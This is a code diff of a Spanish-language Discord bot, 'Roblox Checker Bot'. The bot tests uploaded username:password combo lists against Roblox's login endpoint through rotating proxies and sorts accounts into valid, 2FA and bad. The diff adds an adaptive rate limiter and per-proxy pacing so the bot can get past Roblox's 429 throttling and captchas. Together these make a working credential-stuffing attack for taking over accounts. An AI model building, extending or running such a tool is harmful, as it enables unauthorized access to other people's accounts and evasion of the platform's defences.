@@ -2,7 +2,8 @@
 """
 Roblox Checker Bot
 Comando: /rbx-checker  (file)
-Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME (opcionales salvo el token)
+Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME,
+           REQUESTS_PER_SEC, PROXY_INTERVAL (todas opcionales salvo el token)
 """
 
 import asyncio
@@ -26,12 +27,15 @@ except ImportError:
     ProxyConnector = None
 
 TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
-CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "15")))
+CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "10")))
 TIMEOUT = float(os.getenv("TIMEOUT", "20"))
 PROXY_SCHEME = os.getenv("PROXY_SCHEME", "http").strip().lower()
+REQUESTS_PER_SEC = max(0.2, float(os.getenv("REQUESTS_PER_SEC", "3")))
+PROXY_INTERVAL = max(0.1, float(os.getenv("PROXY_INTERVAL", "1.2")))
 MAX_COMBOS = 50_000
 MAX_FILE = 8 * 1024 * 1024
 MAX_RETRY_AFTER = 30.0
+MAX_INTERVAL = 3.0
 PROXY_PENALTY = 20.0
 STALL_WARN = 60
 EDIT_EVERY = 1.5
@@ -127,8 +131,50 @@ PROXIES: list[Proxy] = list(TODOS)
 MUERTOS: list[Proxy] = []
 AUTH_FALLIDA: list[Proxy] = []
 PROXY_COOLDOWN: dict[str, float] = {}
+PROXY_LAST: dict[str, float] = {}
 GLOBAL_COOLDOWN = 0.0
 _proxy_i = 0
+
+
+class Limiter:
+    """Ritmo global adaptativo. Frena con 429 y se relaja con éxitos."""
+
+    def __init__(self):
+        self.base = 1.0 / REQUESTS_PER_SEC
+        self.interval = self.base
+        self.next_slot = 0.0
+        self.lock = asyncio.Lock()
+        self.racha = 0
+
+    async def wait(self, job=None) -> bool:
+        async with self.lock:
+            ahora = time.monotonic()
+            slot = max(ahora, self.next_slot)
+            self.next_slot = slot + self.interval
+        while True:
+            falta = slot - time.monotonic()
+            if falta <= 0:
+                return True
+            if job and job.stopped:
+                return False
+            await asyncio.sleep(min(falta, 0.25))
+
+    def frenar(self):
+        self.racha = 0
+        self.interval = min(self.interval * 1.6, MAX_INTERVAL)
+
+    def aflojar(self):
+        self.racha += 1
+        if self.racha >= 25:
+            self.racha = 0
+            self.interval = max(self.interval * 0.85, self.base)
+
+    @property
+    def rps(self) -> float:
+        return 1.0 / self.interval
+
+
+LIMITER = Limiter()
 
 
 def next_proxy() -> Proxy | None:
@@ -156,11 +202,17 @@ async def wait_cooldown(proxy: Proxy | None, job=None) -> bool:
         if job and job.stopped:
             return False
         ahora = time.monotonic()
-        hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy.label, 0) if proxy else 0)
-        left = hasta - ahora
-        if left <= 0:
+        hasta = GLOBAL_COOLDOWN
+        if proxy:
+            hasta = max(
+                hasta,
+                PROXY_COOLDOWN.get(proxy.label, 0),
+                PROXY_LAST.get(proxy.label, 0) + PROXY_INTERVAL,
+            )
+        falta = hasta - ahora
+        if falta <= 0:
             return True
-        await asyncio.sleep(min(left, 0.5))
+        await asyncio.sleep(min(falta, 0.25))
 
 
 def retry_delay(r_headers) -> float:
@@ -169,22 +221,21 @@ def retry_delay(r_headers) -> float:
         if not raw:
             continue
         try:
-            return min(max(float(raw), 0.5), MAX_RETRY_AFTER)
+            return min(max(float(raw), 1.0), MAX_RETRY_AFTER)
         except ValueError:
             try:
                 when = parsedate_to_datetime(raw)
                 if when.tzinfo is None:
                     when = when.replace(tzinfo=timezone.utc)
                 delta = (when - datetime.now(timezone.utc)).total_seconds()
-                return min(max(delta, 0.5), MAX_RETRY_AFTER)
+                return min(max(delta, 1.0), MAX_RETRY_AFTER)
             except Exception:
                 continue
-    return 4.0
+    return 8.0
 
 
 # ------------------------------------------------------------------ salud proxies
 async def _probar_proxy(p: Proxy) -> str:
-    """Devuelve 'ok', 'auth' (407) o 'muerto'."""
     try:
         if PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
             connector = ProxyConnector.from_url(p.con_auth, rdns=True)
@@ -207,8 +258,6 @@ async def _probar_proxy(p: Proxy) -> str:
             async with sesion.post(LOGIN_URL, json={}, **kwargs) as r:
                 if r.status == 407:
                     return "auth"
-                if r.status in (400, 401, 403, 429):
-                    return "ok"
                 return "ok" if r.status < 500 else "muerto"
     except Exception:
         return "muerto"
@@ -361,7 +410,6 @@ class Worker:
 
 
 async def _login(w: Worker, proxy: Proxy | None, payload: dict):
-    """Devuelve (status, headers, body). Credenciales siempre explícitas."""
     if proxy and PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
         connector = ProxyConnector.from_url(proxy.con_auth, rdns=True)
         async with aiohttp.ClientSession(
@@ -394,7 +442,6 @@ async def _login(w: Worker, proxy: Proxy | None, payload: dict):
 
 
 async def check_one(w: Worker, user: str, pw: str, job=None):
-    """Devuelve dict de resultado, o None si se detuvo el job."""
     ctype = "Email" if "@" in user else "Username"
     payload = {"ctype": ctype, "cvalue": user, "password": pw}
 
@@ -410,8 +457,12 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
         while intentos < 2:
             if job and job.stopped:
                 return None
+            if not await LIMITER.wait(job):
+                return None
             if not await wait_cooldown(proxy, job):
                 return None
+            if proxy:
+                PROXY_LAST[proxy.label] = time.monotonic()
 
             try:
                 status, headers, body = await _login(w, proxy, payload)
@@ -449,6 +500,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
                 except Exception:
                     data = {}
                 u = (data or {}).get("user") or {}
+                LIMITER.aflojar()
                 return {"status": "valid", "username": u.get("name") or user}
 
             if status == 403:
@@ -460,29 +512,34 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
                 low = body.lower()
 
                 if "twostep" in ctype_h or "twostep" in low or "two-step" in low:
+                    LIMITER.aflojar()
                     return {"status": "2fa"}
                 if challenge or "captcha" in low or "challenge" in low:
+                    LIMITER.aflojar()
                     return {"status": "bad", "note": "captcha", "tipo": "captcha"}
 
                 if intentos < 1:
                     intentos += 1
                     w.csrf.pop(proxy.label if proxy else "directo", None)
                     continue
+                LIMITER.aflojar()
                 return {"status": "bad", "note": "challenge", "tipo": "captcha"}
 
             if status in (400, 401):
+                LIMITER.aflojar()
                 return {"status": "bad"}
 
             if status == 429:
                 esperas += 1
                 delay = retry_delay(headers)
-                penalizar(proxy, delay)
-                if delay >= 15:
-                    globals()["GLOBAL_COOLDOWN"] = max(
-                        GLOBAL_COOLDOWN, time.monotonic() + delay
-                    )
-                if esperas > 4:
+                LIMITER.frenar()
+                penalizar(proxy, max(delay, 10.0))
+                globals()["GLOBAL_COOLDOWN"] = max(
+                    GLOBAL_COOLDOWN, time.monotonic() + max(delay, 2.5)
+                )
+                if esperas > 8:
                     return {"status": "error", "note": "rate limit", "tipo": "429"}
+                await asyncio.sleep(min(delay, 5.0))
                 continue
 
             if status >= 500:
@@ -514,6 +571,7 @@ class Job:
         self.logs: deque[str] = deque(maxlen=LOG_MAX)
         self.contadores = {"429": 0, "captcha": 0, "timeout": 0, "proxy": 0, "http": 0, "fatal": 0}
         self.ultimo_avance = time.monotonic()
+        self.inicio = time.monotonic()
         self.paused = asyncio.Event()
         self.paused.set()
         self.stopped = False
@@ -525,16 +583,34 @@ class Job:
         self.run_task: asyncio.Task | None = None
         self._editor: asyncio.Task | None = None
         self._watchdog: asyncio.Task | None = None
+        self._ultimo_log = ("", "")
 
     @property
     def done(self) -> int:
         return len(self.good) + len(self.twofa) + len(self.bad) + len(self.errors)
 
+    @property
+    def vel(self) -> float:
+        return self.done / max(time.monotonic() - self.inicio, 0.001)
+
     def log(self, tipo: str, mensaje: str):
-        self.logs.append(f"[{time.strftime('%H:%M:%S')}] {tipo:<7} {mensaje}")
         clave = tipo.lower()
         if clave in self.contadores:
             self.contadores[clave] += 1
+
+        seg = time.strftime("%H:%M:%S")
+        if self.logs and self._ultimo_log == (seg, tipo):
+            ultimo = self.logs[-1]
+            if "(x" in ultimo:
+                base, resto = ultimo.rsplit("(x", 1)
+                n = int(resto.rstrip(")")) + 1
+                self.logs[-1] = f"{base}(x{n})"
+            else:
+                self.logs[-1] = f"{ultimo} (x2)"
+            return
+
+        self._ultimo_log = (seg, tipo)
+        self.logs.append(f"[{seg}] {tipo:<7} {mensaje}")
 
     async def _record(self, user: str, pw: str, res: dict):
         combo = f"{user}:{pw}"
@@ -608,7 +684,7 @@ class Job:
                 self.log(
                     "WARN",
                     f"sin avance {int(quieto)}s · {bloqueados} proxies en espera "
-                    f"· operativos {len(PROXIES)}/{len(TODOS)}",
+                    f"· ritmo {LIMITER.rps:.1f}/s",
                 )
                 await self.refresh()
 
@@ -635,7 +711,10 @@ class Job:
         else:
             estado = "Checkeando"
         e.set_footer(
-            text=f"{estado} · {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies operativos"
+            text=(
+                f"{estado} · {self.vel:.1f} combos/s · ritmo {LIMITER.rps:.1f}/s "
+                f"· {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies"
+            )
         )
         return e
 
@@ -652,10 +731,10 @@ class Job:
         ahora = time.monotonic()
         libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p.label, 0) <= ahora)
         e.add_field(
-            name="Proxies",
+            name="Ritmo y proxies",
             value=(
-                f"`{libres}/{len(PROXIES)}` libres · `{len(MUERTOS)}` caídos "
-                f"· `{len(AUTH_FALLIDA)}` auth rechazada "
+                f"`{LIMITER.rps:.2f}/s` objetivo · `{libres}/{len(PROXIES)}` libres "
+                f"· `{len(MUERTOS)}` caídos · `{len(AUTH_FALLIDA)}` auth rechazada "
                 f"· global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`"
             ),
             inline=False,
@@ -788,6 +867,7 @@ class ErrorsView(discord.ui.View):
             f"| timeouts: {self.job.contadores['timeout']} | proxies: {self.job.contadores['proxy']}",
             f"Operativos: {len(PROXIES)}/{len(TODOS)} | caídos: {len(MUERTOS)} "
             f"| auth rechazada: {len(AUTH_FALLIDA)}",
+            f"Ritmo objetivo: {LIMITER.rps:.2f}/s | intervalo base: {LIMITER.base:.2f}s",
             "Proxies configurados:",
             *[f"  {p.label}" for p in TODOS],
             "-" * 40,
@@ -819,6 +899,7 @@ async def on_ready():
         print(f"  {p.label}")
     vivos, muertos, mal_auth = await health_check()
     print(f"Operativos: {vivos} | caídos: {muertos} | auth rechazada: {mal_auth}")
+    print(f"Ritmo inicial: {LIMITER.rps:.2f}/s · por proxy: {1/PROXY_INTERVAL:.2f}/s")
     if not vivos:
         print("Sin proxies utilizables: el bot irá directo y comerá captchas")
 
